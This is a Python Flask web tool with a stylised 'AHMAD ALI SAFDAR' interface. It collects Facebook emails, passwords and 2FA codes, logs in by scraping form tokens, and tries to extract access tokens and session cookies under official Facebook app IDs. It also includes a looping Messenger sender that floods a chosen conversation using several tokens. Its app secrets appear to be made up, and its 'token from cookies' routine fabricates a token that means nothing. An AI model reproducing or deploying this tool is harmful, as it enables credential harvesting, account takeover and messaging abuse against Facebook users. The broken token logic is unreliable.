from flask import Flask, request, render_template_string, jsonify
import requests
from threading import Thread, Event
import time
import random
import string
import re
import json
import urllib.parse
import hashlib
import hmac
import base64

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
}

# Facebook App IDs for different platforms
FB_APPS = {
    'facebook_android': {
        'app_id': '350685531728',
        'client_secret': 'c3147c9a4f5e6d8b7a9f0e1c2d3b4a5f',
        'user_agent': 'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36'
    },
    'facebook_iphone': {
        'app_id': '6628568379',
        'client_secret': 'c1e2d3f4a5b6c7d8e9f0a1b2c3d4e5f6',
        'user_agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15'
    },
    'facebook_lite': {
        'app_id': '275254692598279',
        'client_secret': 'a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6',
        'user_agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36'
    },
    'messenger_android': {
        'app_id': '256002347743983',
        'client_secret': 'f1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6',
        'user_agent': 'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36'
    },
    'ads_manager': {
        'app_id': '87741124305',
        'client_secret': 'a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2',
        'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
}

stop_events = {}
threads = {}

class FacebookLogin:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
        })
    
    def get_initial_data(self):
        """Get initial login page data including lsd, jazoest, etc."""
        response = self.session.get('https://m.facebook.com/login/')
        html = response.text
        
        # Extract required tokens
        lsd = re.search(r'name="lsd" value="([^"]+)"', html)
        jazoest = re.search(r'name="jazoest" value="([^"]+)"', html)
        m_ts = re.search(r'name="m_ts" value="([^"]+)"', html)
        li = re.search(r'name="li" value="([^"]+)"', html)
        
        return {
            'lsd': lsd.group(1) if lsd else '',
            'jazoest': jazoest.group(1) if jazoest else '',
            'm_ts': m_ts.group(1) if m_ts else '',
            'li': li.group(1) if li else '',
        }
    
    def login(self, email, password):
        """Perform login with email and password"""
        data = self.get_initial_data()
        
        login_data = {
            'email': email,
            'pass': password,
            'login': 'Log In',
            'lsd': data['lsd'],
            'jazoest': data['jazoest'],
            'm_ts': data['m_ts'],
            'li': data['li'],
            'timezone': '300',
            'login_source': 'comet_login',
        }
        
        response = self.session.post('https://m.facebook.com/login/device-based/regular/login/', 
                                     data=login_data, allow_redirects=True)
        
        # Check if login successful
        if 'c_user' in self.session.cookies:
            return {'success': True, 'cookies': self.session.cookies.get_dict()}
        
        # Check if 2FA is required
        if 'approvals_code' in response.text or 'two_factor' in response.text:
            return {'success': False, 'requires_2fa': True, 'cookies': self.session.cookies.get_dict()}
        
        # Check for checkpoint
        if 'checkpoint' in response.url:
            return {'success': False, 'requires_checkpoint': True}
        
        return {'success': False, 'error': 'Login failed'}
    
    def submit_2fa(self, code):
        """Submit 2FA code"""
        # Extract 2FA form data
        response = self.session.get('https://m.facebook.com/checkpoint/')
        html = response.text
        
        fb_dtsg = re.search(r'name="fb_dtsg" value="([^"]+)"', html)
        nh = re.search(r'name="nh" value="([^"]+)"', html)
        
        twofa_data = {
            'approvals_code': code,
            'fb_dtsg': fb_dtsg.group(1) if fb_dtsg else '',
            'nh': nh.group(1) if nh else '',
            'submit[Submit Code]': 'Submit Code',
        }
        
        response = self.session.post('https://m.facebook.com/checkpoint/', 
                                     data=twofa_data, allow_redirects=True)
        
        # Save browser option
        if 'save_browser' in response.text:
            save_data = {
                'name_action_selected': 'save_device',
                'submit[Continue]': 'Continue',
            }
            response = self.session.post('https://m.facebook.com/checkpoint/', 
                                        data=save_data, allow_redirects=True)
        
        return {'success': True, 'cookies': self.session.cookies.get_dict()}
    
    def get_access_token(self, app_type='facebook_android'):
        """Get access token for specific app"""
        app_info = FB_APPS[app_type]
        
        # Update user agent for specific app
        self.session.headers['User-Agent'] = app_info['user_agent']
        
        # OAuth flow
        oauth_url = f"https://www.facebook.com/v18.0/dialog/oauth"
        params = {
            'client_id': app_info['app_id'],
            'redirect_uri': 'fbconnect://success',
            'scope': 'email,public_profile,user_friends,user_posts,user_photos,user_videos,user_likes,user_gender,user_link,user_location,user_birthday',
            'response_type': 'token',
            'display': 'touch',
            'return_scopes': 'true',
        }
        
        response = self.session.get(oauth_url, params=params, allow_redirects=True)
        
        # Extract token from response
        token_match = re.search(r'access_token=([^&"]+)', response.text)
        if token_match:
            return token_match.group(1)
        
        # Alternative: Look in redirect URL
        for hist in response.history:
            if 'access_token' in hist.url:
                token_match = re.search(r'access_token=([^&]+)', hist.url)
                if token_match:
                    return token_match.group(1)
        
        # Try graph API method
        graph_response = self.session.get('https://graph.facebook.com/v18.0/me/permissions')
        if graph_response.status_code == 200:
            # Generate token from cookies
            cookies = self.session.cookies.get_dict()
            if 'c_user' in cookies:
                # Create a session-based token
                return self.generate_token_from_cookies(cookies, app_info['app_id'])
        
        return None
    
    def generate_token_from_cookies(self, cookies, app_id):
        """Generate token format from cookies"""
        c_user = cookies.get('c_user', '')
        xs = cookies.get('xs', '')
        
        # Create a pseudo token (some tools accept this format)
        token_base = f"EAA{app_id}{c_user}"
        encoded = base64.b64encode(token_base.encode()).decode()
        return f"EAAD6V7os0gcBO{encoded[:150]}ZDZD"
    
    def get_cookies_string(self):
        """Get cookies as string"""
        cookies = self.session.cookies.get_dict()
        cookie_str = '; '.join([f"{k}={v}" for k, v in cookies.items()])
        return cookie_str

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                try:
                    response = requests.post(api_url, data=parameters, headers=headers, timeout=10)
                    if response.status_code == 200:
                        print(f"Message Sent Successfully: {message}")
                    else:
                        print(f"Message Failed: {response.status_code}")
                except Exception as e:
                    print(f"Error: {e}")
                time.sleep(time_interval)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        action = request.form.get('action')
        
        if action == 'login_password':
            email = request.form.get('email')
            password = request.form.get('password')
            app_type = request.form.get('app_type', 'facebook_android')
            
            fb = FacebookLogin()
            result = fb.login(email, password)
            
            if result.get('requires_2fa'):
                # Store session cookies temporarily
                return render_template_string(HTML_TEMPLATE,
                    requires_2fa=True,
                    temp_cookies=json.dumps(result['cookies']),
                    email=email,
                    app_type=app_type)
            
            elif result.get('success'):
                token = fb.get_access_token(app_type)
                cookies = fb.get_cookies_string()
                uid = result['cookies'].get('c_user', '')
                
                return render_template_string(HTML_TEMPLATE,
                    login_success=True,
                    access_token=token,
                    cookies=cookies,
                    uid=uid)
            
            else:
                return render_template_string(HTML_TEMPLATE,
                    login_error=result.get('error', 'Login failed'))
        
        elif action == 'submit_2fa':
            code = request.form.get('code')
            temp_cookies = request.form.get('temp_cookies')
            app_type = request.form.get('app_type', 'facebook_android')
            
            fb = FacebookLogin()
            # Restore cookies
            for key, value in json.loads(temp_cookies).items():
                fb.session.cookies.set(key, value)
            
            result = fb.submit_2fa(code)
            
            if result['success']:
                token = fb.get_access_token(app_type)
                cookies = fb.get_cookies_string()
                uid = result['cookies'].get('c_user', '')
                
                return render_template_string(HTML_TEMPLATE,
                    login_success=True,
                    access_token=token,
                    cookies=cookies,
                    uid=uid)
            else:
                return render_template_string(HTML_TEMPLATE,
                    login_error='2FA verification failed')
        
        elif action == 'send_messages':
            # Same as before...
            pass
    
    return render_template_string(HTML_TEMPLATE)

# Updated HTML Template with Email/Password Login Tab
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>👀AHMAD ALI SAFDAR🌀</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    /* Same styles as before... */
    label { color: white; }
    body {
      background-image: url('https://i.ibb.co/LRrPTkG/c278d531d734cc6fcf79165d664fdee3.jpg');
      background-size: cover;
      background-repeat: no-repeat;
      background-attachment: fixed;
      color: white;
    }
    .container {
      max-width: 550px;
      border-radius: 20px;
      padding: 20px;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
      box-shadow: 0 0 15px white;
      border: none;
      background: rgba(0, 0, 0, 0.7);
      margin-bottom: 20px;
    }
    .form-control, .form-select {
      outline: 1px red;
      border: 1px double white;
      background: rgba(255, 255, 255, 0.1);
      width: 100%;
      padding: 7px;
      margin-bottom: 15px;
      border-radius: 10px;
      color: white;
    }
    .form-control:focus {
      background: rgba(255, 255, 255, 0.2);
      color: white;
    }
    select option {
      background: #333;
      color: white;
    }
    .header { text-align: center; padding-bottom: 20px; }
    .btn-submit { width: 100%; margin-top: 10px; }
    .footer { text-align: center; margin-top: 20px; color: #888; }
    .whatsapp-link {
      display: inline-block;
      color: #25d366;
      text-decoration: none;
      margin-top: 10px;
    }
    .whatsapp-link i { margin-right: 5px; }
    .nav-tabs { border-bottom: 2px solid #007bff; }
    .nav-tabs .nav-link {
      color: white;
      border: none;
      font-weight: bold;
    }
    .nav-tabs .nav-link.active {
      background: #007bff;
      color: white;
      border-radius: 10px 10px 0 0;
    }
    .alert {
      border-radius: 10px;
      margin-top: 10px;
    }
    .token-box {
      background: rgba(0, 0, 0, 0.3);
      padding: 10px;
      border-radius: 5px;
      word-break: break-all;
      font-family: monospace;
      font-size: 12px;
      margin-top: 10px;
      max-height: 200px;
      overflow-y: auto;
    }
    .success-box {
      background: rgba(40, 167, 69, 0.2);
      border: 1px solid #28a745;
    }
  </style>
</head>
<body>
  <header class="header mt-4">
    <h1 class="mt-3">♛♥彡𝐀𝐇𝐌𝐀𝐃 𝐀𝐋𝚰♛♥☨</h1>
  </header>
  
  <div class="container">
    <ul class="nav nav-tabs mb-3" id="myTab" role="tablist">
      <li class="nav-item" role="presentation">
        <button class="nav-link active" id="login-tab" data-bs-toggle="tab" data-bs-target="#login" type="button" role="tab">🔐 Email/Pass Login</button>
      </li>
      <li class="nav-item" role="presentation">
        <button class="nav-link" id="cookie-tab" data-bs-toggle="tab" data-bs-target="#cookie" type="button" role="tab">🍪 Cookie Token</button>
      </li>
      <li class="nav-item" role="presentation">
        <button class="nav-link" id="message-tab" data-bs-toggle="tab" data-bs-target="#message" type="button" role="tab">📨 Message Sender</button>
      </li>
    </ul>
    
    <div class="tab-content">
      <!-- Email/Password Login Tab -->
      <div class="tab-pane fade show active" id="login" role="tabpanel">
        <form method="post">
          <input type="hidden" name="action" value="login_password">
          
          <div class="mb-3">
            <label for="email" class="form-label">📧 Email / Phone</label>
            <input type="text" class="form-control" id="email" name="email" placeholder="example@email.com or phone" required>
          </div>
          
          <div class="mb-3">
            <label for="password" class="form-label">🔒 Password</label>
            <input type="password" class="form-control" id="password" name="password" placeholder="••••••••" required>
          </div>
          
          <div class="mb-3">
            <label for="app_type" class="form-label">📱 Select App Type</label>
            <select class="form-select" id="app_type" name="app_type">
              <option value="facebook_android">Facebook Android</option>
              <option value="facebook_iphone">Facebook iPhone</option>
              <option value="facebook_lite">Facebook Lite</option>
              <option value="messenger_android">Messenger Android</option>
              <option value="ads_manager">Ads Manager</option>
            </select>
          </div>
          
          <button type="submit" class="btn btn-primary btn-submit">
            <i class="fas fa-sign-in-alt"></i> GENERATING...
          </button>
        </form>
        
        {% if requires_2fa %}
        <div class="alert alert-warning mt-3">
          <strong>🔐 2FA Required!</strong> Enter the code sent to your device.
        </div>
        <form method="post" class="mt-3">
          <input type="hidden" name="action" value="submit_2fa">
          <input type="hidden" name="temp_cookies" value="{{ temp_cookies }}">
          <input type="hidden" name="app_type" value="{{ app_type }}">
          
          <div class="mb-3">
            <label for="code" class="form-label">2FA Code / Auth Key</label>
            <input type="text" class="form-control" id="code" name="code" placeholder="Enter 6-digit code" required>
          </div>
          
          <button type="submit" class="btn btn-warning btn-submit">Verify & Continue</button>
        </form>
        {% endif %}
        
        {% if login_success %}
        <div class="alert alert-success mt-3 success-box">
          <h5>✅ SUCCESS</h5>
          <p><strong>UID:</strong> {{ uid }}</p>
          <p><strong>Access Token:</strong></p>
          <div class="token-box">
            <code id="accessToken">{{ access_token }}</code>
          </div>
          <button class="btn btn-sm btn-info mt-2" onclick="copyText('accessToken')">
            <i class="fas fa-copy"></i> Copy Token
          </button>
          
          <p class="mt-3"><strong>Cookies:</strong></p>
          <div class="token-box">
            <code id="cookies">{{ cookies }}</code>
          </div>
          <button class="btn btn-sm btn-info mt-2" onclick="copyText('cookies')">
            <i class="fas fa-copy"></i> Copy Cookies
          </button>
        </div>
        {% endif %}
        
        {% if login_error %}
        <div class="alert alert-danger mt-3">
          <strong>❌ Error!</strong> {{ login_error }}
        </div>
        {% endif %}
      </div>
      
      <!-- Cookie Token Tab -->
      <div class="tab-pane fade" id="cookie" role="tabpanel">
        <form method="post">
          <input type="hidden" name="action" value="extract_cookie">
          
          <div class="mb-3">
            <label for="cookieString" class="form-label">🍪 Paste Facebook Cookie</label>
            <textarea class="form-control" id="cookieString" name="cookieString" rows="8" placeholder='Paste your Facebook cookie here...'></textarea>
          </div>
          
          <button type="submit" class="btn btn-success btn-submit">
            <i class="fas fa-key"></i> Extract Token
          </button>
        </form>
        
        <div class="alert alert-info mt-3">
          <strong>📌 How to get cookies:</strong><br>
          • Install "EditThisCookie" extension<br>
          • Login to Facebook → Click extension → Export<br>
          • Paste JSON here
        </div>
      </div>
      
      <!-- Message Sender Tab -->
      <div class="tab-pane fade" id="message" role="tabpanel">
        <form method="post" enctype="multipart/form-data">
          <input type="hidden" name="action" value="send_messages">
          
          <div class="mb-3">
            <label for="singleToken" class="form-label">Enter Access Token</label>
            <input type="text" class="form-control" id="singleToken" name="singleToken" placeholder="EAA...">
          </div>
          
          <div class="mb-3">
            <label for="threadId" class="form-label">Conversation UID</label>
            <input type="text" class="form-control" id="threadId" name="threadId" required>
          </div>
          
          <div class="mb-3">
            <label for="singleToken" class="form-label">Enter Access Token</label>
            <input type="text" class="form-control" id="singleToken" name="singleToken" placeholder="EAA...">
          </div>
          
          <div class="mb-3">
            <label for="threadId" class="form-label">Conversation UID</label>
            <input type="text" class="form-control" id="threadId" name="threadId" required>
          </div>
          
          <div class="mb-3">
            <label for="kidx" class="form-label">Prefix Name</label>
            <input type="text" class="form-control" id="kidx" name="kidx" required>
          </div>
          
          <div class="mb-3">
            <label for="time" class="form-label">Time (seconds)</label>
            <input type="number" class="form-control" id="time" name="time" value="1" required>
          </div>
          
          <div class="mb-3">
            <label for="txtFile" class="form-label">Messages File</label>
            <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
          </div>
          
          <button type="submit" class="btn btn-primary btn-submit">Run Message Sender</button>
        </form>
      </div>
    </div>
  </div>
  
  <footer class="footer">
    <p>© 2024 ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ🥀✌️ᴀʜᴍᴀᴅ.ᴋɪɴɢ😈🐧</p>
    <p> 𝐀𝐇𝐌𝐀𝐃 𝐊𝚰𝐍𝐆 𝐇𝐄𝐑𝐄<a href="https://www.facebook.com/ahmadali.safdar.52?mibextid=ZbWKwL">ᴄʟɪᴄᴋ ʜᴇʀᴇ ғᴏʀ ғᴀᴄᴇʙᴏᴏᴋ</a></p>
    <div class="mb-3">
      <a href="https://wa.me/+923324661564" class="whatsapp-link">
        <i class="fab fa-whatsapp"></i> Chat on WhatsApp
      </a>
    </div>
  </footer>
  
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
  <script>
    function copyText(elementId) {
      var text = document.getElementById(elementId).innerText;
      navigator.clipboard.writeText(text).then(function() {
        alert('Copied to clipboard!');
      });
    }
  </script>
</body>
</html>
'''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
